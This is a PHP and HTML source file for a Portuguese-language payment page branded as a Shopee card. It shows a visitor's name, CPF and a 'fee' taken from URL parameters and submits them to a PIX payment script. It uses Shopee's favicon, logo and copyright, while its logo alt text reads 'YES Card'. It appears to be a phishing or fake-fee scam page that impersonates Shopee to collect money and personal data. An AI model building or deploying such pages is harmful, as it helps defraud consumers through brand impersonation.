<?php
// Funções auxiliares
function formatCPF($cpf) {
    $cpf = preg_replace('/[^0-9]/', '', $cpf);
    return preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf);
}

function formatCurrency($value) {
    return 'R$ ' . number_format($value / 100, 2, ',', '.');
}

// Obter e sanitizar parâmetros
$nome = htmlspecialchars($_GET['nome'] ?? 'Não informado', ENT_QUOTES, 'UTF-8');
$cpf = htmlspecialchars($_GET['cpf'] ?? 'Não informado', ENT_QUOTES, 'UTF-8');
$value = filter_input(INPUT_GET, 'value', FILTER_SANITIZE_NUMBER_INT) ?? '0';

// Formatar dados
$cpfFormatado = formatCPF($cpf);
$valorFormatado = formatCurrency($value);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
    <title>Cartão Shopee - Pagamento</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .header {
            background-color: #ffffff;
            padding: 20px;
            text-align: center;
            border-bottom: 3px solid #ee4d2d;
        }

        .header img {
            width: 150px;
        }

        .main-content {
            max-width: 500px;
            background: #fff;
            margin: 50px auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 90%;
        }

        .main-content h1 {
            font-size: 1.5rem;
            font-weight: bold;
            color: #444;
            margin-bottom: 5px;
            text-align: center;
        }

        .main-content h2 {
            font-size: 0.95rem;
            font-weight: normal;
            color: gray;
            margin-bottom: 20px;
            text-align: center;
        }

        .info-box {
            display: flex;
            align-items: center;
            border: 1px solid #e6e6e6;
            border-radius: 8px;
            padding: 10px 15px;
            margin-bottom: 15px;
            background-color: #f9f9f9;
        }

        .info-box img {
            width: 24px;
            height: 24px;
            margin-right: 15px;
            filter: brightness(0);
        }

        .info-box p {
            font-size: 0.9rem;
            color: #444;
            margin: 0;
        }

        .btn-custom {
            background-color: #ee4d2d;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-weight: bold;
            font-size: 0.95rem;
            text-align: center;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-custom:hover {
            background-color: #000;
        }

        .footer {
            background: #ffffff;
            border-top: 1px solid #e6e6e6;
            text-align: center;
            padding: 15px;
            font-size: 10px;
            color: #666;
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        @media (max-width: 600px) {
            .main-content {
                margin: 30px auto;
                padding: 20px;
            }

            .btn-custom {
                font-size: 1rem;
                padding: 14px;
            }

            .footer {
                font-size: 9px;
                padding: 10px;
            }
        }
    </style>
</head>

<body>
    <!-- Header -->
    <div class="header">
        <img src="images/shopee-logo.png" alt="YES Card">
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div id="headerc">
            <div style="margin-bottom: 15px;">
                <h3 style="color: #000; font-size: 1.2rem;">Confirme seus dados</h3>
                <div style="border-top: 2px solid #ee4d2d; margin-top: 5px; margin-bottom: 25px;"></div>
            </div>
            <div class="details" style="line-height: 1.6;">
                <p><strong>Nome:</strong> <span class="userName"><?php echo $nome; ?></span></p>
                <p><strong>CPF:</strong> <span class="userCPF"><?php echo $cpfFormatado; ?></span></p>
                <p><strong>Taxa:</strong> <?php echo $valorFormatado; ?></p>
            </div>
            <form id="payment-form" action="pix.php" method="post">
                <input type="hidden" name="customerName" value="<?php echo $nome; ?>">
                <input type="hidden" name="customerCPF" value="<?php echo $cpf; ?>">
                <input type="hidden" name="price" value="<?php echo $value; ?>">
                <div class="text-center">
                    <button id="gerar-pagamento" class="btn-custom">
                        Gerar pagamento
                    </button>
                </div>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        Copyright 2025 Shopee. Todos os direitos reservados.<br>
        Política de Privacidade | Termos de Uso | Vendas e Reembolsos | Legal | Mapa do Site
    </div>
</body>
</html>
